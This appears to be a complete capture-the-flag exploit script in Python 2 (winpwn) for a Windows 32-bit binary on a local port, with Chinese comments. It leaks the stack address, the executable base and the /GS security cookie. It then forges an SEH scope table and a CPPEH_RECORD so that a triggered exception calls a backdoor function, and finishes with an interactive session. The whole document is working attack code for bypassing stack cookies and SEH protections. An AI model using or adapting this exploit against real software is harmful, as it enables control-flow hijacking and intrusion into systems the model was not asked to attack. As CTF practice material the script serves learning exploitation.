#coding:utf8
from winpwn import *

sh = remote('127.0.0.1',2333)

def sendlineafter(a,b):
    sh.recvuntil(a)
    sh.sendline(b)

sh.sendlineafter = sendlineafter;

def get_data(addr):
   sh.sendlineafter('Do you want to know more?','yes')
   sh.sendlineafter('Where do you want to know',str(addr))
   sh.recvuntil('value is ')
   data = int(sh.recvuntil('\r\n')[0:-2],16)
   return data

sh.recvuntil('stack address = ')
stack_addr = int(sh.recvuntil('\r\n')[0:-2],16)
print 'stack_addr=',hex(stack_addr)
sh.recvuntil('main address = ')
exe_base = int(sh.recvuntil('\r\n')[0:-2],16) - 0x10B0
backdoor = exe_base + 0x138D
security_cookie_addr = exe_base + 0x4004
print 'exe_base=',hex(exe_base)
print 'backdoor=',hex(backdoor)
print 'security_cookie_addr=',hex(security_cookie_addr)
security_cookie = get_data(security_cookie_addr)
print 'security_cookie=',hex(security_cookie)
#伪造SEH SCOPE TABLE
SEH_scope_table = p32(0xFFFFFFE4) #GSCookieOffset
SEH_scope_table += p32(0) #GSCookieXorOffset
SEH_scope_table += p32(0xFFFFFF20) #EHCookieOffset
SEH_scope_table += p32(0) #EHCookieXorOffset
SEH_scope_table += p32(0xFFFFFFFE) #EncloseingLevel
SEH_scope_table += p32(backdoor) #FilterFunc，伪造为后门函数地址
SEH_scope_table += p32(0) #HandlerFunc

payload = 'a'*0x10 + SEH_scope_table
fake_SEH_scope_table_addr = stack_addr + 0x10
payload= payload.ljust(0x80,'a')

payload += p32((stack_addr + 0x9C) ^ security_cookie) #ValidateLocalCookies的校验
#CPPEH_RECORD结构体
payload += p32(stack_addr - 0x44) #esp
payload += p32(0)
payload += p32(stack_addr + 0xD4) #Next
payload += p32(exe_base + 0x1460) #ExceptionHandler
payload += p32(fake_SEH_scope_table_addr ^ security_cookie) #Scope Table
payload += p32(0) #TryLevel

sh.sendlineafter('Do you want to know more?','n')
sh.sendline(payload)
sh.sendlineafter('Do you want to know more?','yes')
sh.sendlineafter('Where do you want to know','1') #地址异常触发SEH调用我们的后门函数

sh.interactive()
